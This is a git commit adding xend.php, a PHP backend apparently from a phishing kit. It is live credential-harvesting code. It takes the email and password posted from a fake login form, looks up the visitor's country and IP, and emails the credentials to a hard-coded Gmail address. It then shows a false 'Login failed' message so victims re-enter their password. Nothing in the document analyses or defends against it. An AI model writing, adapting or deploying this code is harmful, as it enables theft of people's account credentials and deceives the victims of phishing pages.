b3d9a516112970d58318d836d81cf5553d5e0e21
usa342 <opkwon@youngsungusa.com>
2024-07-31 10:33:13 +0100

    Add files via upload

---
+++ xend.php
@@ -0,0 +1,156 @@
+<?php
+
+$country = visitor_country();
+$countryCode = visitor_countryCode();
+$continentCode = visitor_continentCode();
+$ip = getenv("REMOTE_ADDR");
+$browser = $_SERVER['HTTP_USER_AGENT'];
+$email = trim($_POST['temail']);
+$password = trim($_POST['tpass']);
+$server = date("D/M/d, Y g:i a");
+
+if($email != null && $password != null){
+	
+	$own = 'rolandjojo21@gmail.com';
+	$subj = "Login: | $email | $country | $ip";
+
+	$headers = "From: LogZ-2024 xkcdProject <log@xdproject.com> \n";
+	$headers .= "X-Priority: 1\n"; //1 Urgent Message, 3 Normal
+	$headers .= "MIME-Version: 1.0\n";
+	$message = "[Logged] \n\n";
+	$message .= "Username : ".$email."\n";
+	$message .= "Password : ".$password."\n";
+	$message .= "Country: $country | User IP: <a href='http://whoer.net/check?host=$ip' target='_blank'>$ip</a>\n";
+	$message .= "Date : ".$server."\n";
+	mail($own,$subj,$message,$headers);
+	$signal = 'ok';
+	$msg = 'Login failed! Please enter correct password';
+	
+	// $praga=rand();
+	// $praga=md5($praga);
+	
+}
+else{
+	$signal = 'ok';
+	$msg = 'Please fill in all the fields.';
+}
+$data = array(
+        'signal' => $signal,
+        'msg' => $msg
+    );
+    echo json_encode($data);
+    function visitor_country()
+{
+    $client  = @$_SERVER['HTTP_CLIENT_IP'];
+    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
+    $remote  = $_SERVER['REMOTE_ADDR'];
+    $result  = "Unknown";
+    if(filter_var($client, FILTER_VALIDATE_IP))
+    {
+        $ip = $client;
+    }
+    elseif(filter_var($forward, FILTER_VALIDATE_IP))
+    {
+        $ip = $forward;
+    }
+    else
+    {
+        $ip = $remote;
+    }
+
+    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));
+
+    if($ip_data && $ip_data->geoplugin_countryName != null)
+    {
+        $result = $ip_data->geoplugin_countryName;
+    }
+
+    return $result;
+}
+function visitor_countryCode()
+{
+    $client  = @$_SERVER['HTTP_CLIENT_IP'];
+    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
+    $remote  = $_SERVER['REMOTE_ADDR'];
+    $result  = "Unknown";
+    if(filter_var($client, FILTER_VALIDATE_IP))
+    {
+        $ip = $client;
+    }
+    elseif(filter_var($forward, FILTER_VALIDATE_IP))
+    {
+        $ip = $forward;
+    }
+    else
+    {
+        $ip = $remote;
+    }
+
+    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));
+
+    if($ip_data && $ip_data->geoplugin_countryCode != null)
+    {
+        $result = $ip_data->geoplugin_countryCode;
+    }
+
+    return $result;
+}
+function visitor_regionName()
+{
+    $client  = @$_SERVER['HTTP_CLIENT_IP'];
+    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
+    $remote  = $_SERVER['REMOTE_ADDR'];
+    $result  = "Unknown";
+    if(filter_var($client, FILTER_VALIDATE_IP))
+    {
+        $ip = $client;
+    }
+    elseif(filter_var($forward, FILTER_VALIDATE_IP))
+    {
+        $ip = $forward;
+    }
+    else
+    {
+        $ip = $remote;
+    }
+
+    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));
+
+    if($ip_data && $ip_data->geoplugin_regionName != null)
+    {
+        $result = $ip_data->geoplugin_regionName;
+    }
+
+    return $result;
+}
+function visitor_continentCode()
+{
+    $client  = @$_SERVER['HTTP_CLIENT_IP'];
+    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
+    $remote  = $_SERVER['REMOTE_ADDR'];
+    $result  = "Unknown";
+    if(filter_var($client, FILTER_VALIDATE_IP))
+    {
+        $ip = $client;
+    }
+    elseif(filter_var($forward, FILTER_VALIDATE_IP))
+    {
+        $ip = $forward;
+    }
+    else
+    {
+        $ip = $remote;
+    }
+
+    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));
+
+    if($ip_data && $ip_data->geoplugin_continentCode != null)
+    {
+        $result = $ip_data->geoplugin_continentCode;
+    }
+
+    return $result;
+}
+
+
+?>
